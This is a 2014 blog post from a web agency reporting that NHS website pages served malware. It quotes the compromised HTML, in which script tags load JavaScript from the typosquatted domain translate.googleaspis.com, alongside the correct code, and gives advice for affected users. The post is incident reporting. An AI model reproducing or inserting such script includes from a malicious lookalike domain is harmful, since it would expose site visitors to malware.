<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>NHS Website Hosting Malware &middot; </title>

  
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/poole.css">
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/hyde.css">
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="http://edmondscommerce.github.io/css/highlight/github.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

  
  <link href="http://edmondscommerce.github.io/favicon.ico" rel="icon">

  
  
  
  

  <meta name="description" content="The NHS website is hosting currently hosting malware. The full extent of the threat is not completely clear, here is some information.">
  <meta name="keywords" content="">
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'google analytics', 'auto');
    ga('send', 'pageview');
  </script>
  
</head>
<body>
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
        <a href="/"><img src="/images/eclogo.png"
             alt="gravatar" title="">
        </a>
      
      <h1></h1>
      
    </div>
    <p>
      <a href="http://www.edmondscommerce.co.uk">Edmonds Commerce</a> are a UK based E-Commerce web development
      agency. We are based in <a href="http://www.yorkshire.com/">Yorkshire</a> near <a href="http://www.visitleeds.co.uk/">Leeds</a> and <a href="http://www.visitbradford.com/">Bradford</a>.
    </p>

    <p>
      Our primary specialism is <a href="http://magento.com/">Magento</a> and other PHP based E-Commerce platforms
      such as <a href="http://www.opencart.com/">OpenCart</a>.
    </p>

    <p>
      In terms of technology we are very strong in <a href="http://php.net/">PHP</a>, <a href="http://www.mysql.com/">MySQL</a>, <a href="http://www.linuxfoundation.org/">Linux</a>,
      <a href="http://www.w3.org/standards/techs/html#w3c_all">HTML</a><a>, <a href="http://www.w3.org/Style/CSS/Overview.en.html">CSS</a> and <a href="http://en.wikipedia.org/wiki/JavaScript">Javascript</a>.</li>
  </ul>


    <ul class="sidebar-nav">
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/edmondscommerce"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      <a href="https://www.linkedin.com/company/edmonds-commerce"><i class="fa fa-linkedin-square fa-3x"></i></a>
      <a href="https://plus.google.com/104488822194646220248?rel=author"><i class="fa fa-google-plus-square fa-3x"></i></a>
      
      <a href="https://twitter.com/edmondscommerce"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      <a href="http://edmondscommerce.github.io/index.xml" type="application/rss+xml"><i class="fa fa-rss-square fa-3x"></i></a>
      </li>
      <p>
        <a href="mailto:info@edmondscommerce.co.uk">info@edmondscommerce.co.uk</a><br>
        <a href="tel:00441138805654">0044 113 880 5654</a>
      </p>
    </ul>

    

  </div>
</div>


<div class="content container">
  <div class="post">
    <h1 class="post-title">NHS Website Hosting Malware</h1>
    <span class="post-date">Feb 3, 2014 &middot; 2 minute read
    
    <br/>
      <strong>Category: </strong>
    <a class="label" href="http://edmondscommerce.github.io/categories/security">security</a>
    </span>
    

<p>This morning I was made aware that certain pages of the NHS website - the UK&rsquo;s National Health Service - were hosting malware that was automatically redirecting users to malicious pages. The story broke on the popular news site Reddit, you can see the actual reddit thread <a href="http://www.reddit.com/r/unitedkingdom/comments/1wv91h/nhsuk_compromised_many_pages_are_serving_malware/" target="_blank">here</a>.</p>

<p>The first and most important point is that if you ever find yourself unexpectedly redirected from a page to another page then you should definitely not agree to install any software suggsted by the redirected site. Your safest course of action is likely to close the tab or even your browser as soon as possible and then run a full virus scan after updating your virus software.</p>

<h3 id="here-is-some-information-on-this-particular-attack">Here is some information on this particular attack</h3>

<p>The list of URLs originally shown to be hosting this malware can be found <a href="http://pastebin.com/DbvR0iyj" target="_blank">here</a>.</p>

<p>The attack vector seems to be in a (possibly accidental) mis spelling of the domain name that is hosting some Javascript related to Google Translate.</p>

<h4 id="you-can-see-a-correct-chunk-of-html-here">You can see a correct chunk of HTML here:</h4>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/includes/AC_RunActiveContent.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">link</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://translate.googleapis.com/translate_static/css/translateelement.css&quot;</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://translate.googleapis.com/translate_static/js/element/main.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/includes/translate.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>

<h4 id="and-here-is-the-compromised-html">And here is the compromised HTML</h4>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;//translate.googleaspis.com/translate_static/js/element/19/element_main.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;//translate.googleaspis.com/translate_static/js/element/element.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/includes/translate.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>

<p>The domain name googleaspis.com is registered by regtons.com and though the <a href="http://www.whois.com/whois/googleaspis.com" target="_blank">Whois information</a> has the actual domain ownership details obfuscated by a Czech company that protect the actual real ownership details, it does seem that the server and other <a href="http://www.tcpiputils.com/browse/ip-address/31.170.179.179" target="_blank">internet services</a> are all based in the Czech Republic.</p>

<p>Checking the Google Safe Browsing information, you can see that Google have found <a href="http://www.google.co.uk/safebrowsing/diagnostic?site=hmr.nhs.uk/" target="_blank">numerous issues</a> on the NHS domains seemingly starting on the 31st of January this year.</p>

<p>It seems that the NHS have now confirmed that they are aware of this issue and are currently taking action to resolve the problem.</p>

<p>It is still not clear exactly how or why this issue cropped up in the first place. If it was an accident, how did it manage to get past what you would expect to be quite rigorous quality assurance processes? If this was a result of a malicious break in, how did they manage to compromise the website in this way and are there any further security issues that we should, as a nation, be worried about?</p>

  </div>
  
  <br/>
  <strong>Tags: </strong>
  <a class="label" href="http://edmondscommerce.github.io/tags/nhs">nhs</a><a class="label" href="http://edmondscommerce.github.io/tags/malware">malware</a><a class="label" href="http://edmondscommerce.github.io/tags/javascript">javascript</a><a class="label" href="http://edmondscommerce.github.io/tags/compromise">compromise</a><a class="label" href="http://edmondscommerce.github.io/tags/security">security</a>
  
  
</div>




<script src="http://edmondscommerce.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
</body>
</html>

